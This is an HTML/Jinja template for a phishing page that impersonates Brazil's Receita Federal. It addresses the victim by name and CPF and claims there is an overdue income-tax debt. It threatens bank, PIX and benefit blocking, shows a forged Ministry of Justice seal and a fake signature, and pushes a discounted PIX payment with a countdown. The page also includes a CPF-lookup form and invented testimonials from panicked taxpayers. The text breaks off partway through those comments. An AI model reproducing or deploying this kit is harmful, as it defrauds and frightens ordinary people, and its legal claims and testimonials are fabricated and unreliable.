<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Receita Federal</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
            font-weight: 400;
            font-style: italic;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
            font-weight: 500;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
            font-weight: 600;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
            font-weight: 700;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
            font-weight: 800;
            font-style: normal;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rawline', sans-serif;
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loading-logo {
            width: 120px;
            height: auto;
            margin-bottom: 40px;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f0f0f0;
            border-top: 3px solid #003472;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 20px;
            font-family: 'Rawline', sans-serif;
            font-size: 16px;
            color: #003472;
            font-weight: 600;
        }

        .main-content {
            display: none;
        }

        .main-content.show {
            display: block;
        }
        body {
            background-color: white;
            padding-top: 60px;
            color: #333333;
            font-size: 16px;
            line-height: 1.05;
        }
        h3, h4 {
            font-size: 18px;
            line-height: 1.05;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 20px;
            background-color: white;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            height: 60px;
        }
        .logo {
            width: 240px;
            height: auto;
        }
        .header-icons {
            display: flex;
            gap: 15px;
        }
        .header-icon {
            font-size: 18px;
            color: #0056b3;
        }
        .hero-image {
            width: 100%;
            height: auto;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .hero-image img {
            width: 100%;
            height: auto;
            object-fit: cover;
        }
        .user-info {
            display: flex;
            flex-direction: column;
            position: relative;
            margin: 15px 0;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
            background-color: white;
            padding: 15px;
            border-radius: 4px;
            width: 100%;
        }
        .user-info:first-of-type {
            margin-bottom: 30px;
        }
        .user-info-content {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            width: 100%;
        }
        .user-info p {
            margin: 1px 0;
            color: #333333;
            font-size: 16px;
        }
        .user-info p strong {
            font-weight: 600;
        }
        .user-info h3 {
            font-weight: 700;
            color: #0c326f;
            margin-bottom: 4px;
        }
        .user-info-image {
            width: 50px;
            height: auto;
            justify-self: end;
            align-self: start;
            margin-left: 10px;
            filter: drop-shadow(0px 2px 3px rgba(0, 0, 0, 0.2));
        }
        /* Aumentando o espa√ßamento ap√≥s os dados do contribuinte */
        .user-info:nth-of-type(2) .user-info-content {
            margin-bottom: 35px;
            padding-bottom: 15px;
        }
        .message-box {
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 15px;
            margin-top: 15px;
            margin-bottom: 25px;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
        }
        .message-box p {
            margin-bottom: 8px;
            width: 100%;
            font-size: 16px;
            line-height: 1.45;
        }
        .message-box strong {
            font-weight: 700;
        }
        .message-box .red-strong {
            color: #a71d2a;
            font-weight: 700;
        }
        .countdown-timer {
            font-weight: bold;
            color: #ffffff;
            margin-top: 8px;
            background-color: #dc3545;
            padding: 4px 8px;
            border-radius: 4px;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
            width: 100%;
            text-align: center;
        }
        .tax-details {
            margin-top: 25px;
            padding: 15px;
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            position: relative;
            overflow: hidden;
        }
        .tax-details::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/e/e8/Logo_Receita_Federal_do_Brasil.svg');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            opacity: 0.05;
            z-index: 0;
        }
        .tax-details > * {
            position: relative;
            z-index: 1;
        }
        .tax-details h4 {
            font-weight: 600;
            margin-bottom: 25px;
            color: #0c326f;
            line-height: 1.45;
        }
        .tax-details .document-data {
            display: grid;
            grid-template-columns: auto 1fr;
            gap: 15px;
            margin-bottom: 25px;
        }
        .tax-details .document-data dt {
            font-weight: 600;
            text-align: right;
            padding: 8px 15px;
            background-color: rgba(248, 249, 250, 0.8);
            border: 1px solid #dee2e6;
            border-radius: 4px;
            min-width: 80px;
            white-space: nowrap;
            overflow-x: auto;
        }
        .tax-details .document-data dd {
            font-weight: normal;
            padding: 8px 15px;
            background-color: rgba(255, 255, 255, 0.8);
            border: 1px solid #dee2e6;
            border-radius: 4px;
            margin-left: 0;
            white-space: nowrap;
            overflow-x: auto;
        }
        .tax-details .document-data dt,
        .tax-details .document-data dd {
            display: flex;
            align-items: center;
        }
        .tax-details .total-value {
            font-size: 20px;
            line-height: 1.45;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid #dee2e6;
        }
        .regularize-button {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;
            text-align: center;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin-top: 25px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .news-image {
            width: 100%;
            height: auto;
            margin: 8px auto 0;
            display: block;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .news-description {
            color: #333;
            margin-top: 12px;
            padding: 0 4px;
            text-align: justify;
            width: 100%;
        }
        .footer {
            background-color: #01205B;
            color: white;
            padding: 16px;
            text-align: center;
            margin-top: 40px;
            width: 100%;
            position: relative;
            bottom: 0;
        }
        .footer-logo {
            width: 100px;
            margin: 0 auto 8px;
            display: block;
        }
        @media (max-width: 600px) {
            .header {
                padding: 6px 8px;
            }
            .logo {
                width: 160px;
            }
            .header-icons {
                gap: 8px;
            }
            .header-icon {
                font-size: 16px;
            }
            .message-box {
                width: 100%;
            }
            .news-image {
                max-width: 100%;
            }
            .news-description {
                margin-left: 0;
            }
        }

        @keyframes pulse {
            0% {
                transform: translate(-50%, -50%) scale(1);
            }
            50% {
                transform: translate(-50%, -50%) scale(1.1);
            }
            100% {
                transform: translate(-50%, -50%) scale(1);
            }
        }

        .sound-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(220, 53, 69, 0.9);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            animation: pulse 1s infinite ease-in-out;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }

        .video-container {
            position: relative;
            width: 100%;
            margin: 8px auto 0;
            border-radius: 4px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .news-video {
            width: 100%;
            display: block;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 2000;
            overflow-y: auto;
            padding: 0;
            margin: 0;
        }

        .modal-content {
            background-color: white;
            width: 100vw;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            border-radius: 0;
            box-shadow: none;
            position: relative;
            overflow-y: auto;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
        }

        .modal-header {
            text-align: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #dee2e6;
        }

        .modal-logo {
            width: 180px;
            height: auto;
            margin: 0 auto;
            display: block;
        }

        /* QR Code Container */
        .qr-code-container {
            display: none;
            text-align: center;
            padding: 15px 0 30px 0;
            flex: 1;
            overflow-y: auto;
        }

        .qr-code-img {
            width: 180px;
            height: 180px;
            margin: 0 auto 15px;
        }

        .customer-info {
            background-color: #f8f9fa;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 12px;
            border-left: 4px solid #0c326f;
            text-align: left;
        }

        .customer-info p {
            margin: 3px 0;
            color: #333;
            text-align: left;
        }

        .customer-info .total-amount {
            color: #dc3545;
            font-weight: 700;
            margin-top: 8px;
            font-size: 16px;
        }

        .warning-text {
            color: white;
            background: linear-gradient(135deg, #dc3545, #c82333);
            border: 2px solid #a71e2a;
            padding: 15px;
            border-radius: 2px;
            margin: 15px 0;
            font-weight: 600;
            text-align: center;
            box-shadow: 0 4px 20px rgba(220, 53, 69, 0.3);
            font-size: 14px;
            line-height: 1.4;
        }

        .countdown-timer-pix {
            background-color: #dc3545;
            color: #fff;
            font-weight: 800;
            padding: 8px;
            border-radius: 4px;
            margin: 0 0 10px 0;
            text-align: center;
            font-size: 18px;
        }

        .pix-code-container {
            background-color: #fff;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            padding: 8px;
            margin: 12px 0;
        }

        .pix-code {
            font-family: monospace;
            word-break: break-all;
            margin: 0;
            padding: 8px;
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .copy-button-container {
            text-align: center;
            margin: 20px 0 30px 0;
            padding-bottom: 30px;
        }

        .copy-pix-button {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            width: 80%;
            justify-content: center;
        }

        .copy-pix-button:hover {
            background-color: #218838;
        }

        /* Ministry Seal Styles */
        .ministry-seal-container {
            text-align: center;
            margin: 20px 0;
            padding: 15px 0;
        }

        .ministry-seal {
            margin-bottom: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .ministry-seal-img {
            width: 60px;
            height: 60px;
            object-fit: contain;
        }

        .ministry-text {
            margin-top: 8px;
        }

        .ministry-name {
            font-size: 14px;
            font-weight: 700;
            color: #333;
            margin: 0 0 4px 0;
            letter-spacing: 0.5px;
        }

        .ministry-gov {
            font-size: 12px;
            font-weight: 600;
            color: #666;
            margin: 0;
            letter-spacing: 0.3px;
        }

        /* Modal no mobile */
        @media (max-width: 600px) {
            .modal {
                width: 100vw;
                height: 100vh;
                padding: 0;
            }
            
            .modal-content {
                width: 100vw;
                min-height: 100vh;
                padding: 15px;
                box-sizing: border-box;
            }
            
            .copy-button-container {
                margin: 20px 0 50px 0;
                padding-bottom: 50px;
            }
            
            .copy-pix-button {
                width: 90%;
                padding: 15px 20px;
                font-size: 16px;
            }
        }

        /* Script JavaScript adicional para o cron√¥metro */
        @keyframes copy-feedback {
            0% { background-color: #0c326f; }
            50% { background-color: #28a745; }
            100% { background-color: #0c326f; }
        }

        .copy-success {
            animation: copy-feedback 1s ease;
        }

        /* Loader Animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-container {
            text-align: center;
            padding: 30px 0;
        }

        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(12, 50, 111, 0.1);
            border-radius: 50%;
            border-top-color: #0c326f;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 15px;
        }

        .loader-text {
            color: #0c326f;
            font-weight: 600;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Logo_Receita_Federal_do_Brasil.svg/1194px-Logo_Receita_Federal_do_Brasil.svg.png" alt="Receita Federal" class="loading-logo">
        <div class="loading-spinner"></div>
        <div class="loading-text">Carregando dados...</div>
    </div>

    <!-- Main Content -->
    <div class="main-content" id="mainContent">
        <div class="header">
        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
        <div class="header-icons">
            <i class="fas fa-search header-icon"></i>
            <i class="fas fa-question-circle header-icon"></i>
            <i class="fas fa-adjust header-icon"></i>
        </div>
    </div>
    <div class="hero-image">
        <img alt="Aviso sobre novas regras do PIX" src="https://i.ibb.co/cSFXVMXx/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-4.png">
    </div>
    {% if show_confirmation %}
    <div class="user-info">
        <div class="user-info-content">
            <div class="user-info-text">
                <h3>INTIMA√á√ÉO FISCAL - RECEITA FEDERAL DO BRASIL</h3>
                <p style="text-align: justify; line-height: 1.4;">
                    <strong>{{ customer.nome }}</strong>, portador(a) do CPF <strong>{{ customer.cpf }}</strong>, 
                    em conformidade com o artigo 142 do CTN, informamos que ap√≥s cruzamento de dados das suas 
                    declara√ß√µes do Imposto de Renda Pessoa F√≠sica do ano de 2020, foi identificada 
                    uma pend√™ncia tribut√°ria em sua situa√ß√£o fiscal.
                </p>
                <p style="text-align: justify; line-height: 1.4; margin-top: 10px;">
                    <strong style="color: #721c24;">PRAZO FINAL:</strong> {{ customer.today_date }} √© o √∫ltimo dia para regulariza√ß√£o. 
                    O n√£o cumprimento desta intima√ß√£o resultar√° nas seguintes puni√ß√µes conforme 
                    Instru√ß√£o Normativa RFB n¬∫ 1.888/2019:
                </p>
                <ul style="margin: 10px 0; padding-left: 0; line-height: 1.6; list-style: none;">
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">‚óè</span><strong>Bloqueio de contas banc√°rias e cart√µes</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">‚óè</span><strong>Impossibilidade de movimentar PIX, TED e DOC</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">‚óè</span><strong>Restri√ß√µes no Banco Central e SERASA</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">‚óè</span><strong>Suspens√£o do acesso a benef√≠cios federais (Aux√≠lio, Bolsa Fam√≠lia, etc.)</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">‚óè</span><strong>Impedimento para financiamentos, empr√©stimos e compras no cr√©dito</strong></li>
                    <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">‚óè</span><strong>Aplica√ß√£o de multa autom√°tica de at√© 150%</strong></li>
                </ul>
                <p style="margin-top: 12px; font-weight: 600;">
                    Confirme se os dados abaixo correspondem √† sua identifica√ß√£o:
                </p>
            </div>
        </div>
        <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin-top: 10px; border-left: 4px solid #0c326f;">
            <p><strong>Nome:</strong> {{ customer.nome }}</p>
            <p><strong>CPF:</strong> {{ customer.cpf }}</p>
            {% if customer.data_nascimento %}
            {% set date_parts = customer.data_nascimento.split(' ')[0].split('-') if ' ' in customer.data_nascimento else customer.data_nascimento.split('-') %}
            {% if date_parts|length == 3 %}
            <p><strong>Data de Nascimento:</strong> {{ date_parts[2] }}/{{ date_parts[1] }}/{{ date_parts[0] }}</p>
            {% else %}
            <p><strong>Data de Nascimento:</strong> {{ customer.data_nascimento }}</p>
            {% endif %}
            {% endif %}
            {% if customer.nome_mae %}
            <p><strong>Nome da M√£e:</strong> {{ customer.nome_mae }}</p>
            {% endif %}
        </div>
        <div style="margin-top: 20px; text-align: center;">
            <div onclick="confirmData()" style="background: #f8f9fa; border: 2px solid #dee2e6; border-radius: 0px; padding: 20px; max-width: 320px; margin: 0 auto; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                <h3 style="margin: 0 0 8px 0; font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #000;">
                    MINIST√âRIO DA JUSTI√áA
                </h3>
                <h4 style="margin: 0 0 15px 0; font-size: 12px; font-weight: bold; letter-spacing: 0.5px; color: #000;">DOCUMENTO OFICIAL</h4>
                <div style="width: 70px; height: 70px; margin: 0 auto 12px; display: flex; align-items: center; justify-content: center;">
                    <img src="https://i.postimg.cc/7YpN6X2K/brasao-1.png" alt="Bras√£o do Minist√©rio da Justi√ßa" style="width: 60px; height: 60px; object-fit: contain;">
                </div>
                <p style="margin: 8px 0; font-size: 13px; line-height: 1.4; color: #333; text-align: justify;">
                    Este documento foi assinado em <strong>{{ customer.today_date }}</strong> e possui 
                    permiss√£o do Minist√©rio da Justi√ßa para fazer cumprir todos os bloqueios e restri√ß√µes 
                    supracitados em face de <strong>{{ customer.nome }}</strong>, portador do CPF n¬∫ <strong>{{ customer.cpf }}</strong>, 
                    conforme legisla√ß√£o vigente.
                </p>
                <div style="margin: 15px auto; padding: 12px; max-width: 280px;">
                    <p style="margin: 0 0 8px 0; font-size: 12px; font-weight: 600; color: #666;">
                        Secret√°rio Especial da Receita Federal
                    </p>
                    <p style="margin: 0; font-size: 18px; font-family: 'Brush Script MT', cursive, 'Lucida Handwriting', 'Apple Chancery', fantasy; color: #000; font-weight: normal; font-style: italic;">
                        Robinson Sakiyama Barreirinhas
                    </p>
                    <div style="width: 200px; height: 1px; background-color: #333; margin: 3px auto 0; opacity: 0.6;"></div>
                </div>
            </div>
        </div>
    </div>
    {% elif show_cpf_search %}
    <div class="user-info">
        <div class="user-info-content">
            <div class="user-info-text">
                <h3>CONSULTA DE D√âBITOS TRIBUT√ÅRIOS</h3>
                <p style="text-align: justify; line-height: 1.4; margin-bottom: 30px;">
                    Para consultar d√©bitos tribut√°rios, digite seu CPF no campo abaixo e clique em "Realizar consulta".
                </p>

                <form id="cpfForm" style="margin-top: 30px;">
                    <div style="margin-bottom: 20px;">
                        <label for="cpfInput" style="display: block; margin-bottom: 8px; font-weight: 600; color: #0c326f;">
                            Digite seu CPF:
                        </label>
                        <input 
                            type="text" 
                            id="cpfInput" 
                            name="cpf" 
                            placeholder="000.000.000-00"
                            maxlength="14"
                            style="width: 100%; padding: 12px; border: 2px solid #dee2e6; border-radius: 4px; font-size: 16px; font-family: monospace;"
                            required
                        >
                    </div>
                    
                    <button 
                        type="submit" 
                        style="width: 100%; padding: 15px; background-color: #0c326f; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.3s ease;"
                        onmouseover="this.style.backgroundColor='#084080'"
                        onmouseout="this.style.backgroundColor='#0c326f'"
                    >
                        üîç REALIZAR CONSULTA
                    </button>
                </form>
            </div>
        </div>
    </div>
    {% else %}
    <div class="user-info">
        <div class="user-info-content">
            <div class="user-info-text">
                <h3>Not√≠cia na m√≠dia</h3>
                <p><strong>Programa:</strong> Jornal da Band</p>
                <p><strong>Data:</strong> 05 de mar√ßo de 2025</p>
            </div>
        </div>
        <div class="video-container">
            <video id="newsVideo" class="news-video" autoplay muted playsinline webkit-playsinline>
                <source src="{{ url_for('static', filename='videos/news.mp4') }}" type="video/mp4">
                Seu navegador n√£o suporta o elemento de v√≠deo.
            </video>
            <button id="soundButton" class="sound-button">
                <i class="fas fa-volume-up"></i>
                <span>CLIQUE PARA OUVIR!</span>
            </button>
        </div>
        <p class="news-description" id="newsDescription"></p>
    </div>
    {% endif %}
    
    {% if show_confirmation %}
    <div class="user-info">
            <div class="user-info-content">
                <div class="user-info-text">
                    <h3>DADOS DO DEVEDOR</h3>
                    <p><strong>NOME:</strong> {{ customer.nome.upper() }}</p>
                    <p><strong>CPF:</strong> <strong>{{ customer.cpf }}</strong></p>
                </div>
                <img src="https://i.ibb.co/xKfzBFbn/download-1.png" alt="User profile icon" class="user-info-image">
            </div>

            <div class="tax-details">
                <h4>Diverg√™ncias calculadas pela Receita Federal que devem ser pagas:</h4>
                
                <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin: 15px 0; border-left: 4px solid #0c326f;">
                    <p style="margin: 0 0 10px 0; font-size: 14px;"><strong>Valor original do d√©bito:</strong> R$ 348,86</p>
                    <p style="margin: 0; font-size: 16px; font-weight: bold; color: #0c326f;"><strong>Valor com desconto:</strong> R$ 126,62</p>
                </div>
                
                <dl class="document-data">
                    <dt>IRPF</dt>
                    <dd>R$ 126,62</dd>
                </dl>
                                
                <div style="background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 20px; margin: 15px 0; border-radius: 4px; border-left: 4px solid #dc3545;">
                    <p style="margin: 0 0 15px 0; font-weight: bold; font-size: 16px; text-align: center;">‚ö†Ô∏è NOTIFICA√á√ÉO OFICIAL - PRAZO FINAL</p>
                    <p style="margin: 0 0 15px 0; line-height: 1.5; text-align: justify;">
                        O n√£o cumprimento da obriga√ß√£o tribut√°ria at√© <strong>02/08/2025</strong> resultar√° na imposi√ß√£o de multa adicional no valor de <strong>R$ 1.985,00</strong> e na aplica√ß√£o das seguintes medidas administrativas pela Receita Federal do Brasil:
                    </p>
                    <div style="margin: 15px 0;">
                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
                            <strong>1. BLOQUEIO BANC√ÅRIO:</strong> Suspens√£o de todas as contas correntes, poupan√ßas e investimentos
                        </div>
                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
                            <strong>2. RESTRI√á√ÉO CREDIT√çCIA:</strong> Inscri√ß√£o do nome nos √≥rg√£os de prote√ß√£o ao cr√©dito (SPC/SERASA)
                        </div>
                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
                            <strong>3. BLOQUEIO DO CPF:</strong> Impossibilidade de realizar transa√ß√µes financeiras e opera√ß√µes banc√°rias
                        </div>
                    </div>
                </div>
                
                <p>Para regularizar a situa√ß√£o fiscal e evitar a aplica√ß√£o das penalidades previstas no documento oficial, √© obrigat√≥rio efetuar o pagamento das diverg√™ncias calculadas pela Receita Federal no valor total de <strong>R$ 126,62</strong>.</p>
                <button class="regularize-button">Regularizar agora</button>
            </div>
        </div>
        
        <!-- Comments Section -->
        <div style="background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; margin: 30px auto; padding: 25px; max-width: 100%;">
            <h3 style="color: #0c326f; font-weight: 600; margin-bottom: 20px; text-align: center; font-size: 18px;">
                <i class="fas fa-comments" style="margin-right: 8px;"></i>
                Relatos de outros contribuintes
            </h3>
            
            <div style="display: grid; gap: 15px;">
                <!-- Comment 1 - Desperate person -->
                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Maria Silva</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 2 horas</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        GENTE, PELO AMOR DE DEUS, PAGUEM URGENTE! Eu ignorei essas notifica√ß√µes por semanas achando que era golpe. Hoje acordei com TODAS as minhas contas bloqueadas, cart√£o cancelado e PIX suspenso. N√£o consigo nem comprar p√£o! Estou desesperada tentando regularizar mas agora √© muito mais caro... üò≠
                    </p>
                </div>

                <!-- Comment 2 - Success story -->
                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Jo√£o Santos</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 3 horas</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Acabei de receber a confirma√ß√£o! Paguei 248 reais ontem e hoje meu CPF j√° est√° regularizado. Valeu muito a pena pegar o desconto. Recomendo a todos que n√£o deixem para depois, o processo √© r√°pido e seguro. üëç
                    </p>
                </div>

                <!-- Comment 3 - Desperate person -->
                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Carlos Eduardo</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 1 hora</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Pessoal, estou com o mesmo problema da Maria. Pensei que fosse spam e agora estou pagando caro pela besteira. Minha conta do banco est√° bloqueada h√° 3 dias, n√£o consigo fazer nenhuma transfer√™ncia.... Como fa√ßo para resolver isso HOJE mesmo?
                    </p>
                </div>

                <!-- Comment 4 - Success story -->
                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Ana Paula</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 5 horas</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Gente, paguei de manh√£ e √† tarde j√° recebi confirma√ß√£o que estava tudo regularizado. O chat com a auditora foi muito esclarecedor! üòä
                    </p>
                </div>

                <!-- Comment 5 - Desperate person -->
                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Roberto Lima</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 30 min</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        URGENTE!!! Algu√©m sabe se tem como reverter o bloqueio? Meu sal√°rio caiu na conta hoje e n√£o consigo sacar NADA! Estou no banco agora e me disseram que o problema √© com a Receita Federal. Preciso de ajuda, tenho contas para pagar hoje...
                    </p>
                </div>

                <!-- Comment 6 - Success story -->
                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Fernanda Costa</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 4 horas</span>
                        </div>
                    </div>
                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
                        Para quem est√° na d√∫vida: √â REAL e √© OFICIAL! Paguei ontem √†s 14h e √†s 16h j√° tinha recebido o comprovante de regulariza√ß√£o. Agora posso fazer empr√©stimos e financiamentos sem problemas. N√£o deixem para amanh√£!
                    </p>
                </div>

                <!-- Comment 7 - Desperate person -->
                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
                        </div>
                        <div>
                            <strong style="color: #333;">Luciana Oliveira</strong>
                            <span style="color: #666; font-size: 12px; margin-left: 8px;">h√° 1 hora</span>
